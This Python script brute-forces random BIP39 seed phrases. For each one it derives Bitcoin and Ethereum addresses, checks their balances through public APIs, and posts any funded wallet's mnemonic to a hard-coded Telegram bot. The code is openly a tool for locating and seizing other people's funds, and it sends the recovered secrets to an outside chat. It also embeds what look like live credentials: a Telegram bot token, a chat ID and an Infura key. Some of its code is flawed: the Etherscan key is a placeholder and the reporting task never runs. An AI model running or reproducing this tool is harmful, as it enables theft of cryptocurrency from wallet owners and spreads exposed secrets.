import asyncio
import threading
import requests
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
from web3 import Web3

# Telegram Bot Credentials
TELEGRAM_BOT_TOKEN = "6600045884:AAHCVIaUjbi9a0GbiQpcOEJcpxK-g0iqQsU"
TELEGRAM_CHAT_ID = "737206288"

# Ethereum & Bitcoin API Endpoints
ETHERSCAN_API = "https://api.etherscan.io/api"
BTC_API = "https://blockchain.info/q/addressbalance/"

# Ethereum Node URL
ETH_NODE = "https://mainnet.infura.io/v3/75722298119549be9f2e368591eb0a7b"

# Connect to Ethereum
web3 = Web3(Web3.HTTPProvider(ETH_NODE))

# Track statistics
total_generations = 0
valid_addresses = 0
lock = threading.Lock()

def send_telegram_message(message):
    """Sends a message to Telegram."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"[⚠️] Telegram Error: {e}")

def generate_wallet():
    """Generates a new BTC & ETH wallet, checks balances, and reports if non-zero."""
    global total_generations, valid_addresses

    # Generate Mnemonic
    mnemonic = Bip39MnemonicGenerator().Generate()
    seed = Bip39SeedGenerator(mnemonic).Generate()
    
    # Bitcoin Address Generation
    bip44_btc = Bip44.FromSeed(seed, Bip44Coins.BITCOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
    btc_address = bip44_btc.PublicKey().ToAddress()

    # Ethereum Address Generation
    bip44_eth = Bip44.FromSeed(seed, Bip44Coins.ETHEREUM).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
    eth_address = bip44_eth.PublicKey().ToAddress()

    # Check Balances
    btc_balance = check_btc_balance(btc_address)
    eth_balance = check_eth_balance(eth_address)

    with lock:
        total_generations += 1
        if btc_balance > 1e-9 or eth_balance > 1e-9:
            valid_addresses += 1
            message = f"""
            🔹 **Wallet with Balance Found!**
            🔹 **BTC:** {btc_address} - {btc_balance} BTC
            🔹 **ETH:** {eth_address} - {eth_balance} ETH
            🔹 **Mnemonic:** {mnemonic}
            """
            print(message)
            send_telegram_message(message)

def check_btc_balance(address):
    """Checks BTC balance from blockchain.info API."""
    try:
        response = requests.get(f"{BTC_API}{address}")
        if response.status_code == 200:
            return int(response.text) / 1e8  # Convert Satoshis to BTC
    except Exception as e:
        print(f"[⚠️] BTC Balance Check Failed: {e}")
    return 0

def check_eth_balance(address):
    """Checks ETH balance from Etherscan API."""
    try:
        response = requests.get(f"{ETHERSCAN_API}?module=account&action=balance&address={address}&tag=latest&apikey=YOUR_ETHERSCAN_API_KEY")
        if response.status_code == 200:
            data = response.json()
            return int(data["result"]) / 1e18  # Convert Wei to ETH
    except Exception as e:
        print(f"[⚠️] ETH Balance Check Failed: {e}")
    return 0

async def report_statistics():
    """Reports statistics every 5 minutes."""
    while True:
        await asyncio.sleep(300)  # 5 minutes
        with lock:
            message = f"📊 **5-Min Report:** {total_generations} total generations, {valid_addresses} valid wallets found."
            print(message)
            send_telegram_message(message)

async def main():
    """Runs the wallet generator indefinitely using threads."""
    report_task = asyncio.create_task(report_statistics())

    while True:
        threads = []
        for _ in range(10):  # Run 10 threads in parallel
            t = threading.Thread(target=generate_wallet)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()  # Ensure all threads complete before the next batch

# Run indefinitely
if __name__ == "__main__":
    asyncio.run(main())
